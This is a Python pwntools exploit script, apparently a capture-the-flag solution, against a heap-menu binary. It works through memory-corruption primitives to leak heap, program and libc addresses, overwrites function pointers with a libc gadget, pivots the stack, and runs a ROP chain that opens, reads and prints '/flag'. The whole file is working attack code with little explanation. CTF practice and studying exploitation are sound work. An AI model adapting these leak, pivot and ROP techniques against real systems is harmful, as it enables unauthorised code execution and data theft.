from pwn import *
import struct
p = process('./pwn')
# p = remote('s1.r3.ret.sh.cn', 31813)
elf = ELF('./pwn')
lib = elf.libc

def add(id, size, msg, num, fmt=1):
    p.recvuntil(b'Please select:')
    p.sendline(b'1')
    p.recvuntil(b':')
    p.sendline(str(id).encode())
    p.recvuntil(b':')
    p.sendline(str(size).encode())
    p.recvuntil(b':')
    p.sendline(msg)
    p.recvuntil(b':')
    if fmt == 1:
        p.sendline(b'1')
    else:
        p.sendline(b'%s')
    p.recvuntil(b':')
    if type(num) == bytes:
        p.sendline(num)
    else:
        p.sendline(str(num).encode())
        
def delete(id):
    p.recvuntil(b'Please select:')
    p.sendline(b'2')
    p.recvuntil(b':')
    p.sendline(str(id).encode())
    
def show(id, leak=True):
    p.recvuntil(b'Please select:')
    p.sendline(b'3')
    p.recvuntil(b':')
    p.sendline(str(id).encode())
    if leak:
        p.recvuntil(b'Magic number: ')
        num = int(p.recvuntil(b'\n')[:-1])
        if num < 0:
            num = 0x100000000 + num
        return num
    
    
def edit(id, num):
    p.recvuntil(b'Please select:')
    p.sendline(b'4')
    p.recvuntil(b':')
    p.sendline(str(id).encode())
    p.recvuntil(b':')
    if type(num) == bytes:
        print(f'send num:{num}, len:{hex(len(num))}')
        p.sendline(num)
    else:
        print(f'send num:{num}, len:{hex(len(str(num)))}')
        p.sendline(str(num).encode())

def qsort(id1, id2, id3):
    p.recvuntil(b'Please select:')
    p.sendline(b'5')
    p.recvuntil(b':')
    p.sendline(str(id1).encode())
    p.recvuntil(b':')
    p.sendline(str(id2).encode())
    p.recvuntil(b':')
    p.sendline(str(id3).encode())
    
    
def setid(id):
    p.recvuntil(b'Please select:')
    p.sendline(b'6')
    p.recvuntil(b':')
    p.sendline(str(id).encode())
    
    
def makecode(offset, code):
    r = process(f"./brute {str(offset)} {str(code)}", shell=True)
    num = r.recvline()[:-1]
    r.close()
    if num == b'Error.':
        print('Error')
        exit(0)
    edit(7, num)
    setid(7)
    
def setheap_addr(addr, off, len):
    for i in range(len):
        code = (addr >> (i * 8)) & 0xff
        makecode(off + i, code)
        
def set_ptr_data(ptr, data):
    data1 = data & 0xffffffff
    data2 = (data >> 32) & 0xffffffff
    edit(9, addr2f(ptr))
    edit(1, addr2f(data1))
    edit(9, addr2f(ptr + 4))
    edit(1, addr2f(data2))
        
def addr2f(addr):
    return struct.unpack('<f', struct.pack('<I', addr & 0xffffffff))[0]

add(0, 0x80, b'0', 0)
add(1, 0x80, b'1', 0)
add(2, 0x80, b'2', 0)
    
for i in range(3, 0x8):
    add(i, 0x80, str(i).encode(), 0)

add(0x8, 0x80, b'08 # nan', 0)  
add(0x9, 0x80, b'9', 1)  
add(0xa, 0x80, b'10 # nan', 1)   
add(0xb, 0x80, b'11', 1)   
add(0xc, 0x80, b'12', 1)
add(0xd, 0x80, b'13', 1)
add(0xe, 0x30, b'14', 1)
add(0xf, 0x80, b'max', b'10e2222222222222222')


qsort(0xf, 0xf, 8)
edit(10, 0)
qsort(0xf, 0xf, 10)

edit(12, 0)
edit(15, 1)
edit(9, 0)
edit(12, 1)
qsort(15, 15, 9)
makecode(0x98, 0x60)
edit(1, 1)
edit(1, 0)
delete(15)
delete(0)
delete(1)
delete(2)
add(0, 0x30, b'0', 0)
add(1, 0x80, b'1 # hack', 0)
add(2, 0x30, b'2', 0)
delete(2)
low_heap_addr = show(1) - 0x514c0
print(hex(low_heap_addr))
add(2, 0x30, b'\x00', 0)
add(15, 0x30, b'15', 1)
edit(9, 0)
qsort(15, 15, 9)
low_fake_list = low_heap_addr + 0x510c0 - 0x20
fake_num = low_heap_addr + 0x514c0 + 4 # true_addr + 4
setheap_addr(low_fake_list, 0x68, 4)
edit(5, 1)
edit(5, 0)
delete(2)
delete(3)

edit(9, addr2f(fake_num))
high_heap_addr = show(1)
print(hex(high_heap_addr))
heap_addr = (high_heap_addr << 32) + low_heap_addr
print(hex(heap_addr))

elf_ptr = heap_addr + 0x51098
edit(9, addr2f(elf_ptr + 4))
high_elf_addr =show(1)
print(hex(high_elf_addr))
if high_elf_addr != high_heap_addr:
    print('Error: high elf addr not match!')
    exit(0)
edit(9, addr2f(elf_ptr))
low_elf_addr = show(1) - 0x25ca
elf_addr = (high_elf_addr << 32) + low_elf_addr
print(hex(elf_addr))

got_addr = elf_addr + elf.got['getrandom']
edit(9, addr2f(got_addr + 4))
high_libc_addr = show(1)
edit(9, addr2f(got_addr))
low_libc_addr = show(1) - lib.symbols['getrandom']
libc_addr = (high_libc_addr << 32) + low_libc_addr
print(hex(libc_addr))

fake_name = heap_addr + 0x51110
fake_func = fake_name + 0x8
payload_addr = heap_addr + 0x81000
gadget = libc_addr + 0x0000000000162da3
gets = libc_addr + lib.symbols['gets']
set_ptr_data(fake_name, gets)
set_ptr_data(fake_func, gadget)  # set to xdrrec_endofrecord
edit(9, addr2f(fake_num - 4))
mov_rsp_rdx_ret = libc_addr + 0x000000000005a120
payload = p64(0) * 2
payload += p64(mov_rsp_rdx_ret) # func
payload += p64(0) # rsi
payload += p64(payload_addr + 0x50) # rdx & fake_rsp
payload += p64(heap_addr) * 2
payload = payload.ljust(0x50, b'a')

pop_rax = 0x0000000000045eb0 + libc_addr
pop_rsi = 0x000000000002be51 + libc_addr
pop_rdi = 0x000000000002a3e5 + libc_addr
pop_rsp = 0x0000000000035732 + libc_addr
pop_rdx = 0x00000000000904a9 + libc_addr
syscall = 0x0000000000091316 + libc_addr
mov_edi_rsi_rdx = 0x000000000019a0d7 + libc_addr
flag_addr = heap_addr + 0x82086
payload += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + b'/flag\x00\x00\x00' + p64(pop_rax) + p64(2) + p64(syscall)
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap_addr + 0x800) + p64(pop_rdx) + p64(0x100) * 2 + p64(pop_rax) + p64(0) + p64(syscall)
payload += p64(pop_rdx) + p64(0x100) * 2 + p64(pop_rsi) + p64(elf_addr + 0x7388 - 0x100 + 4) + p64(mov_edi_rsi_rdx)
payload += p64(pop_rsi) + p64(heap_addr + 0x800) + p64(pop_rax) + p64(1) + p64(syscall)

add(3, 0x800, payload, b'3')
"""
mov    rbx, qword ptr [rdi + 0x18]
mov    rdx, qword ptr [rbx + 0x20] # rdx->0x20
mov    rcx, qword ptr [rbx + 0x30] # rcx->0x30
mov    rax, rdx
sub    rax, rcx
sub    rax, 4
or     eax, 0x80000000
bswap  eax
test   esi, esi
jne    xdrrec_endofrecord+88      

mov    rsi, qword ptr [rbx + 0x18] # rsi->0x18
mov    rdi, qword ptr [rbx]        # rdi->0x0
mov    dword ptr [rbx + 0x38], 0
mov    dword ptr [rcx], eax
sub    rdx, rsi
mov    rbp, rdx
call   qword ptr [rbx + 0x10]      # func->0x10
"""
show(4, leak=False)

payload = p64(payload_addr) * 10
p.sendline(payload)


p.interactive()
    
